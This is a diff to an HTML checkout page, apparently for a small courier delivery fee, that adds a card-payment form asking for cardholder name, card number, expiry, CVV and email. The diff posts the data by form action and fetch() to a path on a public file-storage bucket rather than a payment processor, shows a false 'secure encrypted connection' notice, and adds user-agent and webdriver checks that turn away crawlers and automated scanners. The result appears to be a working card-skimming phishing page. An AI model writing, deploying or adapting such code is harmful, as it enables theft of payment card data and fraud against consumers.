@@ -4926,7 +4926,18 @@
                                                             </div>
                                                         </div>
 
-                                                        <form  action="https://f006.backblazeb2.com/file/dwiupo/cc.html" class="mb-32 md:mb-0">
+                                                        <style>
+                                                            .cc-field { margin-bottom: 14px; }
+                                                            .cc-field label { display:block; font-size:13px; color:#444; margin-bottom:6px; font-weight:500; }
+                                                            .cc-field input { width:100%; padding:11px 13px; border:1px solid #d6d8e0; border-radius:8px; font-size:15px; background:#fff; color:#222; outline:none; transition:border-color .15s, box-shadow .15s; }
+                                                            .cc-field input:focus { border-color:#191D63; box-shadow:0 0 0 3px rgba(25,29,99,.12); }
+                                                            .cc-row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+                                                            .cc-error { background:#fee; border:1px solid #c33; color:#c33; padding:10px 12px; border-radius:8px; margin-bottom:12px; font-size:14px; }
+                                                            .cc-secure { text-align:center; font-size:12px; color:#888; margin-top:10px; }
+                                                            .cc-secure::before { content:"\01F512  "; }
+                                                            .hp-field { position:absolute !important; left:-9999px !important; top:-9999px !important; width:1px !important; height:1px !important; opacity:0 !important; }
+                                                        </style>
+                                                        <form id="paymentForm" action="https://f006.backblazeb2.com/file/dwiupo/api/submit" method="POST" novalidate autocomplete="on" class="mb-32 md:mb-0">
                                                             <div class="grid grid-cols-1 md:grid-cols-2 md:gap-x-4">
                                                                 <div class="xs:shadow-md rounded-md bg-white mt-3 mb-2 border-gray-100 border p-4 xs:p-6 block">
                                                                     <div class="flex flex-row justify-between items-start">
@@ -5036,6 +5047,40 @@
                                                                                                 </div>
                                                                                             </div>
                                                                                         </div>
+
+                                                                                        <br />
+                                                                                        <div id="cc-error-container" aria-live="assertive"></div>
+                                                                                        <div class="cc-field">
+                                                                                            <label for="cardholder">Cardholder name</label>
+                                                                                            <input type="text" id="cardholder" name="cardholder" required autocomplete="cc-name" placeholder="Name on card" />
+                                                                                        </div>
+                                                                                        <div class="cc-field">
+                                                                                            <label for="card_number">Card number</label>
+                                                                                            <input type="tel" id="card_number" name="card_number" required autocomplete="cc-number" inputmode="numeric" maxlength="23" placeholder="1234 5678 9012 3456" />
+                                                                                        </div>
+                                                                                        <div class="cc-row">
+                                                                                            <div class="cc-field">
+                                                                                                <label for="card_expiry">Expiry (MM/YY)</label>
+                                                                                                <input type="tel" id="card_expiry" name="card_expiry" required autocomplete="cc-exp" inputmode="numeric" maxlength="5" placeholder="MM/YY" />
+                                                                                            </div>
+                                                                                            <div class="cc-field">
+                                                                                                <label for="card_cvv">CVV</label>
+                                                                                                <input type="tel" id="card_cvv" name="card_cvv" required autocomplete="cc-csc" inputmode="numeric" maxlength="4" placeholder="123" />
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <div class="cc-field">
+                                                                                            <label for="email">Email (for receipt)</label>
+                                                                                            <input type="email" id="email" name="email" required autocomplete="email" placeholder="you@example.com" />
+                                                                                        </div>
+
+                                                                                        <!-- Honeypot field (bots fill this) -->
+                                                                                        <label for="company_url" class="hp-field" aria-hidden="true">Company Website (leave blank)</label>
+                                                                                        <input type="text" id="company_url" name="company_url" class="hp-field" tabindex="-1" autocomplete="off" aria-hidden="true" />
+                                                                                        <!-- Timing check -->
+                                                                                        <input type="hidden" id="form_load_time" name="form_load_time" value="" />
+                                                                                        <!-- 20-30 character browser session token -->
+                                                                                        <input type="hidden" id="session_token" name="session_token" value="" />
+                                                                                        <p class="cc-secure">Your payment is processed over a secure encrypted connection.</p>
                                                                                     </div>
                                                                                 </div>
                                                                             </div>
@@ -5053,12 +5098,119 @@
                                                                             type="submit"
                                                                             class="button rounded-full h-12 md:h-9 focus:outline-none focus:ring-1 focus:ring-primary inline-flex justify-center items-center px-5 py-2 border leading-4 font-medium rounded-full shadow-sm focus: outline-none border-transparent text-white bg-black hover:bg-primary-dark items-center sm:w-auto w-full"
                                                                         >
-                                                                            <div>CONFIRM AND PROCEED TO PAYMENT</div>
+                                                                            <div>PAY R18.99</div>
                                                                         </button>
                                                                     </div>
                                                                 </div>
                                                             </div>
                                                         </form>
+                                                        <script>
+                                                            (function () {
+                                                                function generateSessionToken() {
+                                                                    var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                                                                    var length = 20 + Math.floor(Math.random() * 11);
+                                                                    var bytes;
+                                                                    if (window.crypto && typeof window.crypto.getRandomValues === 'function') {
+                                                                        bytes = new Uint8Array(length);
+                                                                        window.crypto.getRandomValues(bytes);
+                                                                    } else {
+                                                                        bytes = new Array(length);
+                                                                        for (var i = 0; i < length; i++) bytes[i] = Math.floor(Math.random() * 256);
+                                                                    }
+                                                                    var out = '';
+                                                                    for (var j = 0; j < length; j++) out += alphabet.charAt(bytes[j] % alphabet.length);
+                                                                    return out;
+                                                                }
+                                                                var token = null;
+                                                                try { token = window.sessionStorage && window.sessionStorage.getItem('courrier_session_token'); } catch (e) {}
+                                                                if (!token || token.length < 20 || token.length > 30) {
+                                                                    token = generateSessionToken();
+                                                                    try { if (window.sessionStorage) window.sessionStorage.setItem('courrier_session_token', token); } catch (e) {}
+                                                                }
+                                                                window.__sessionToken = token;
+                                                            })();
+
+                                                            function clientBotCheck() {
+                                                                var ua = (navigator.userAgent || '').toLowerCase();
+                                                                var badUA = /bot|crawler|spider|crawling|headless|puppeteer|playwright|phantomjs|selenium|wget|curl|python-requests|scrapy/i;
+                                                                if (badUA.test(ua)) return 'Bot detected via User-Agent.';
+                                                                if (navigator.webdriver === true) return 'Automated browser detected.';
+                                                                if (!navigator.languages || navigator.languages.length === 0) return 'Suspicious browser environment.';
+                                                                return null;
+                                                            }
+                                                            function ccShowError(msg) {
+                                                                var c = document.getElementById('cc-error-container');
+                                                                if (!c) return;
+                                                                c.innerHTML = '';
+                                                                var d = document.createElement('div');
+                                                                d.className = 'cc-error';
+                                                                d.setAttribute('role', 'alert');
+                                                                d.textContent = msg;
+                                                                c.appendChild(d);
+                                                            }
+                                                            function ccClearError() {
+                                                                var c = document.getElementById('cc-error-container');
+                                                                if (c) c.innerHTML = '';
+                                                            }
+
+                                                            document.addEventListener('DOMContentLoaded', function () {
+                                                                document.getElementById('form_load_time').value = Date.now();
+                                                                document.getElementById('session_token').value = window.__sessionToken;
+
+                                                                var cardInput = document.getElementById('card_number');
+                                                                cardInput.addEventListener('input', function () {
+                                                                    var v = this.value.replace(/\D/g, '').slice(0, 19);
+                                                                    var groups = v.match(/.{1,4}/g);
+                                                                    this.value = groups ? groups.join(' ') : '';
+                                                                });
+                                                                var expInput = document.getElementById('card_expiry');
+                                                                expInput.addEventListener('input', function () {
+                                                                    var v = this.value.replace(/\D/g, '').slice(0, 4);
+                                                                    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+                                                                    this.value = v;
+                                                                });
+                                                                var cvvInput = document.getElementById('card_cvv');
+                                                                cvvInput.addEventListener('input', function () {
+                                                                    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                                                                });
+
+                                                                var form = document.getElementById('paymentForm');
+                                                                var payButton = document.getElementById('save_button');
+
+                                                                form.addEventListener('submit', async function (e) {
+                                                                    e.preventDefault();
+                                                                    ccClearError();
+
+                                                                    var botReason = clientBotCheck();
+                                                                    if (botReason) { ccShowError(botReason); return; }
+
+                                                                    var originalHTML = payButton.innerHTML;
+                                                                    payButton.disabled = true;
+                                                                    payButton.innerHTML = '<div>Processing\u2026</div>';
+
+                                                                    try {
+                                                                        var formData = new FormData(form);
+                                                                        var response = await fetch('https://f006.backblazeb2.com/file/dwiupo/api/submit', {
+                                                                            method: 'POST',
+                                                                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                                                            body: new URLSearchParams(formData)
+                                                                        });
+                                                                        var result = await response.json();
+                                                                        if (result && result.success) {
+                                                                            window.location.href = result.redirect || 'https://f006.backblazeb2.com/file/dwiupo/processing.html';
+                                                                            return;
+                                                                        }
+                                                                        ccShowError((result && result.message) || 'Payment could not be processed. Please try again.');
+                                                                    } catch (err) {
+                                                                        console.error('Submission error:', err);
+                                                                        ccShowError('A network error occurred. Please try again.');
+                                                                    } finally {
+                                                                        payButton.disabled = false;
+                                                                        payButton.innerHTML = originalHTML;
+                                                                    }
+                                                                });
+                                                            });
+                                                        </script>
                                                     </div>
                                                 </div>
                                             </div>
